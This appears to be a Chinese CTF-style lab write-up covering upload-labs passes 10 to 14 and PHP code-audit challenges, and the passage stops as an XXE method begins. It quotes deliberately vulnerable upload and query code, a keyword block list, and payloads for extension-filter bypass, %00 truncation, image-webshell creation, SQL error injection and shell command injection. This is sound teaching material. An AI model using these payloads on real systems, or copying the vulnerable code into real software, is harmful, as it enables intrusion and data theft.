            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p> 这一句代码是用来检测末尾是否是<code>.</code>，可以双写绕过。<br>抓包将文件名改为<code>1.php. .</code> （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了 </p>
<img src="https://i.loli.net/2020/11/30/wldCgUcOSKWPxMu.png" style="zoom:50%;">

<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);

        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        
        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>


<p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
<p>这段代码是将文件名中出现  <code>deny_ext</code>的后缀名替换为空</p>
<p>可以双写绕过，即<code>1.pphphp</code></p>
<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);
    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);
    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;

        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;
    &#125;
&#125;</code></pre>

<p>本题与之前的题目有所不同，这题的文件的保存路径是可以控制的</p>
<p>这里用的<code>%00截断</code>，原理如下</p>
<p><code>www.xxx.com/qq.jpg</code></p>
<p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php</p>
<img src="https://i.loli.net/2020/11/30/TwSKHkqZFC78uRd.png" style="zoom:50%;">



<h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>这题与上题利用的原理相同</p>
<p>但是这里要使用 00的二进制形式</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/13.png" style="zoom:50%;">



<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/13-1.png" style="zoom:50%;">



<h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>明确说了上传图片木马</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;
    <span class="hljs-variable">$file</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);
    <span class="hljs-variable">$bin</span> = fread(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span>
    fclose(<span class="hljs-variable">$file</span>);
    <span class="hljs-variable">$strInfo</span> = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);    
    <span class="hljs-variable">$typeCode</span> = intval(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    
    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    
    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      
        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;
            <span class="hljs-keyword">break</span>;        
        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;
        &#125;    
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;
&#125;</code></pre>

<p><strong>GIF89a</strong> 是GIF图片的文件头 ，是为了绕过gif文件的检查</p>
<p><strong>图片木马的制作</strong></p>
<p>桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马</p>
<p><img src="https://i.loli.net/2020/11/30/vXmVIJ3OEzcnrsL.png" alt></p>
<p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p>
<img src="https://i.loli.net/2020/11/30/KWgpdyf8xoFqcMn.png" style="zoom:50%;">



<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="1-in-array"><a href="#1-in-array" class="headerlink" title="1.in_array"></a>1.in_array</h2><pre><code class="hljs php"><span class="hljs-comment">//1.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;
<span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败: &quot;</span>);
&#125;

<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users&quot;</span>;
<span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>();
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;
    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_assoc();
    <span class="hljs-variable">$whitelist</span> = range(<span class="hljs-number">1</span>, <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;COUNT(*)&#x27;</span>]);
&#125;

<span class="hljs-variable">$id</span> = stop_hack(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);
<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span>&quot;</span>;

<span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$id</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;id <span class="hljs-subst">$id</span> is not in whitelist.&quot;</span>);
&#125;

<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;
    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_assoc();
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;
    &#125;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;
&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$conn</span>-&gt;error);
&#125;

<span class="hljs-meta">?&gt;</span>
</code></pre>



<p><strong>漏洞解析</strong> ：</p>
<p>这一关卡考察的是一个任意文件上传漏洞，而导致这一漏洞的发生则是不安全的使用 <strong>in_array()</strong> 函数来检测上传的文件名，即上图中的第12行部分。由于该函数并未将第三个参数设置为 <strong>true</strong> ，这导致攻击者可以通过构造的文件名来绕过服务端的检测，例如文件名为 <strong>7shell.php</strong> 。因为PHP在使用 <strong>in_array()</strong> 函数判断时，会将 <strong>7shell.php</strong> 强制转换成数字7，而数字7在 <strong>range(1,24)</strong> 数组中，最终绕过 <strong>in_array()</strong> 函数判断，导致任意文件上传漏洞。</p>
<p><strong style="color:orange;">in_array()</strong></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320210651995.png" alt="image-20210320210651995" style="zoom: 67%;">

<p>漏洞利用的例题如下</p>
<pre><code class="hljs php"><span class="hljs-comment">//index.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;
<span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败: &quot;</span>);
&#125;

<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users&quot;</span>;
<span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>();
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;
    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_assoc();
    <span class="hljs-variable">$whitelist</span> = range(<span class="hljs-number">1</span>, <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;COUNT(*)&#x27;</span>]);
&#125;
<span class="hljs-variable">$id</span> = stop_hack(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);
<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span>&quot;</span>;
<span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$id</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;id <span class="hljs-subst">$id</span> is not in whitelist.&quot;</span>);
&#125;
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;
    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_assoc();
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;
    &#125;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;
&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$conn</span>-&gt;error);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>



<pre><code class="hljs php"><span class="hljs-comment">//config.php</span>
<span class="hljs-meta">&lt;?php</span>  
<span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;
<span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;fire&quot;</span>;
<span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;fire&quot;</span>;
<span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;day1&quot;</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stop_hack</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;
    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;</span>;
    <span class="hljs-variable">$back_list</span> = explode(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-variable">$pattern</span>);
    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$back_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$hack</span>)&#123;
        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/<span class="hljs-subst">$hack</span>/i&quot;</span>, <span class="hljs-variable">$value</span>))
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$hack</span> detected!&quot;</span>);
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>可以看到网页的功能很简单，就是输入用户id，然后服务器返回用户的信息，但是对id参数使用in_array()函数进行了检查，但是我们可以利用上面提到的漏洞，只要payload的第一个字符在range(1,count(*))的范围之内即可绕过第检查。绕过效果如下</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320214443192.png" alt="image-20210320214443192" style="zoom:67%;">

<p>但是有一个stop_hack函数，其过滤了很多sql注入中常用的关键词，导致了很多方法无法使用，其中or被过滤就很麻烦，information_schema中包含or单词，所以常规的注入方法无法使用。</p>
<p>这里可以使用报错注入，使用 make_set()函数实现报错注入。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320215543202.png" alt="image-20210320215543202" style="zoom:67%;">

<pre><code class="hljs reasonml">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,make<span class="hljs-constructor">_set(7,0x7e,(<span class="hljs-params">select</span> <span class="hljs-params">user</span>()</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)</code></pre>

<p>表名，列名无法使用information_shcema，但是如果是为了获取flag的话，可以猜测是在flag表的flag列</p>
<p>最后获取flag的payload</p>
<pre><code class="hljs reasonml">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,make<span class="hljs-constructor">_set(7,0x7e,(<span class="hljs-params">select</span> <span class="hljs-params">flag</span> <span class="hljs-params">from</span> <span class="hljs-params">flag</span>)</span>,<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320220057808.png" alt="image-20210320220057808" style="zoom:50%;">





<h2 id="2-filter-var函数缺陷"><a href="#2-filter-var函数缺陷" class="headerlink" title="2.filter_var函数缺陷"></a>2.filter_var函数缺陷</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$url</span>) &amp;&amp; filter_var(<span class="hljs-variable">$url</span>, FILTER_VALIDATE_URL))&#123;
    <span class="hljs-variable">$site_info</span> = parse_url(<span class="hljs-variable">$url</span>);
    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/sec-redclub.com$/&#x27;</span>,<span class="hljs-variable">$site_info</span>[<span class="hljs-string">&#x27;host&#x27;</span>]))&#123;
        exec(<span class="hljs-string">&#x27;curl &quot;&#x27;</span>.<span class="hljs-variable">$site_info</span>[<span class="hljs-string">&#x27;host&#x27;</span>].<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-variable">$result</span>);
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="hljs-subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span>
<span class="hljs-string">              &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> implode(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-variable">$result</span>);
    &#125;
    <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);
    &#125;

&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span>
<span class="hljs-string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;
&#125;

<span class="hljs-meta">?&gt;</span>
</code></pre>



<p><strong style="color:orange;">filter_var</strong></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320222243276.png" alt="image-20210320222243276" style="zoom:50%;">

<p><strong>代码审计</strong></p>
<p>输入的网址首先经过 filter_var()判断是否符合 uri 格式要求，然后用 parse_url()</p>
<p>提取出其中的 host 部分，拼接到 exec()函数里，而 url 是可控的，明显思路是要利用</p>
<p>exec()来命令执行。</p>
<p>可以使用如下 payload 进入命令执行，引号用来闭合 curl 后面的引号，分号则用来闭</p>
<p>合命令，从而执行 ls 命令，并且由于 parse_url()的解析问题，会把第一个分号后面的</p>
<p>内容当作 host 部分，则绕过了正则匹配检查。</p>
<pre><code class="hljs awk">?url=hello:<span class="hljs-regexp">//</span><span class="hljs-string">&quot;;ls;&quot;</span>sec-redclub.com</code></pre>

<p>此时的<code>$site_info[host]</code>的值为<code>&quot;;dir;&quot;sec-redclub.com</code>，那么拼接后的语句 为</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-built_in">dir</span>;<span class="hljs-string">&quot;sec-redclub.com&quot;</span></code></pre>

<p>这样当exec执行时就会执行到dir命令，所以就可以列出目录</p>
<p>读取flag</p>
<pre><code class="hljs awk">?url=hello:<span class="hljs-regexp">//</span><span class="hljs-string">&quot;;more$&#123;IFS&#125;;&quot;</span>sec-redclub.com</code></pre>



<h2 id="3-实例化任意对象漏洞"><a href="#3-实例化任意对象漏洞" class="headerlink" title="3.实例化任意对象漏洞"></a>3.实例化任意对象漏洞</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NotFound</span></span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;404&#x27;</span>);
    &#125;
&#125;
spl_autoload_register(
    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;
        <span class="hljs-keyword">new</span> NotFound();
    &#125;
);
<span class="hljs-variable">$classname</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-variable">$param</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-variable">$param2</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(class_exists(<span class="hljs-variable">$classname</span>))&#123;
    <span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$classname</span>(<span class="hljs-variable">$param</span>,<span class="hljs-variable">$param2</span>);
    var_dump(<span class="hljs-variable">$newclass</span>);
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$newclass</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;=&gt;&#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;
&#125;
</code></pre>

<p>这道题目考察的是实例化漏洞结合XXE漏洞。我们在上图第18行处可以看到使用了 <strong>class_exists</strong> 函数来判断类是否存在，如果不存在的话，就会调用程序中的 <strong>__autoload</strong> 函数，但是这里没有 <strong>__autoload</strong> 函数，而是用 <a href="http://php.net/manual/en/function.spl-autoload-register.php"><strong>spl_autoload_register</strong></a> 注册了一个类似 <strong>__autoload</strong> 作用的函数，即这里输出404信息。</p>
<p>我们这里直接利用PHP的内置类，先用 <strong>GlobIterator</strong> 类搜索 <strong>flag文件</strong> 名字，来看一下PHP手册对 <strong>GlobIterator</strong> 类的 构造函数的定义：</p>
<blockquote>
<p>public <strong>GlobIterator::__construct</strong> ( string <code>$pattern</code> [, int <code>$flags</code> = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] )</p>
</blockquote>
<p>首先我们需要知道 flag 在哪个文件中，在 PHP 的内置类中可以用 GlobIterator 类来遍历文件系统，其构造函数的第一个参数为要搜索的文件名，第二个参数为选择文件的哪个</p>
<p>列目录的payload:</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/homework/</span>php<span class="hljs-regexp">/xxe/i</span>ndex.php?name=GlobIterator&amp;param=./*.php&amp;param2=<span class="hljs-number">0</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320230302156.png" alt="image-20210320230302156">读取flag</p>
<p><strong>方法一：</strong></p>
<p>实例化 SimpleXMLElement类来进行 XXE</p>
